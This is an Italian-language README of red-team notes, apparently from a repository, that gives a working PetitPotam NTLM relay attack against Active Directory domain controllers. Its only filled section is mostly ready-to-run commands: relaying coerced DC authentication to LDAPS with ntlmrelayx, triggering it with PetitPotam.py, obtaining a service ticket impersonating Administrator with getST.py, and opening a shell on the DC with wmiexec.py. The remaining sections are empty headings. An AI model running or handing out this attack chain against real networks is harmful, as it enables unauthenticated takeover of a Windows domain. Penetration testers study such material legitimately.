# ADTech

Appunti, metodologia di penetration test per il rilevamento di anomalie, elenco di strumenti, script e comandi di Windows che trovo utili durante INPT/AS (red teaming).

## Tabelle contenuti

- [Attack 1. PetitPotam - NTLMv1 relay attack](#STEP-1-PetitPotam-NTLMv1-relay-attack-)
- [Step 2. Reconnaissance](#STEP-2-RECONNAISSANCE-)
- [Step 3. Gaining access](#STEP-3-GAINING-ACCESS-)

----------------
### Attack 1. PetitPotam - NTLMv1 relay attack 🔐🕸🧑🏼‍💻

#### Prerequisiti

➤ PetitPotam sul Domain Controller

➤ Uso di NTLMv1 come protocollo di autenticazione (lo vedi con un Responder ad esempio)

➤ Almeno 2 Domain Controller

#### Proof of Concept

➤ Set-up NTLM relay verso il servizio LDAP su l'altro Domain Controller

```
Terminale 1:

python3 ntlmrealyx.py -t ldaps://<DC2 IP> --remove-mic -smb2support --delegate-access
```

➤ Exploit della vulnerabilità PetitPotam, sfruttando il protocollo MS-EFSRPC per fare una chiamata API che triggera il target (DC1) ad autenticarsi alla macchina controllata dall'attaccante. Tale attacco funziona senza avere una utenza di dominio.

```
Terminale 2:

python3 PetitPotam.py -d <domain> <IP Attacker> <DC1 IP>
```

➤ La macchina attaccante riceve NTLM e lo inoltra al secondo DC tramite LDAP. Nello specifico l'attacco porta alla creazione di un nuovo computer macchina che gli viene assegnata la delega di impersonificare qualsiasi utente dentro DC1

➤ Viene forgiato un Silver Ticket per impersonificare un Amminsitratore dentro DC1. Ti salva il TGS in Administrator.ccache

```
python3 getST.py -spn cifs/<FQDN DC1> -impersonate Administrator <domain>/'<username computer macchina creato>'
```

➤ Forgiato il ticket è possibile accedere a DC1

```
KRB5CCNAME=Administrator.ccache python3 wmiexec.py -k -no-pass @FQDN DC1 
```

-----------------
#### STEP 2. RECONNAISSANCE 🕵


-----------------
#### STEP 3. GAINING ACCESS 🔓🧑🏼‍💻

---------------
#### STEP 4. POST-EXPLOITATION and LOCAL PRIVILEGE ESCALATION 🛠🧑🏼‍💻 


-----------------
#### STEP 5. NETWORK LATERAL MOVEMENT and PRIVILEGED ACCOUNTS HUNTING 🕸🧑🏼‍💻 

